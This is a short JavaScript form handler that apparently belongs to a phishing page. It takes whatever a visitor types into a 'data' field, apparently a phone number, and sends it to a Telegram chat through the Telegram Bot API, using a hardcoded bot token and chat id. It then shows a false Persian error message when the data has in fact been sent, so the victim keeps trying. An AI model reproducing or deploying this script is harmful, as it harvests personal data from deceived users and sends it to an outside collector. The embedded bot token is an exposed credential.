document.getElementById("loggerForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    var data = document.getElementById("data").value; // Get the data from the input field
  
    // Send the data to the Telegram bot using the fetch API
    fetch("https://api.telegram.org/bot7089001257:AAFWtmFWIaSXXY4Q1japuPnTvSchx_e7NB8/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "1171970672",
        text: data
      })
    })
    .then(function(response) {
      if (response.ok) {
        alert("مشکلی پیش آمد بعدا دوباره امتحان کنید");
      } else {
        alert("لطفا شماره خود را صحیح وارد کنید🙏");
      }
    })
    .catch(function(error) {
      console.error("An error occurred:", error);
    });
  });
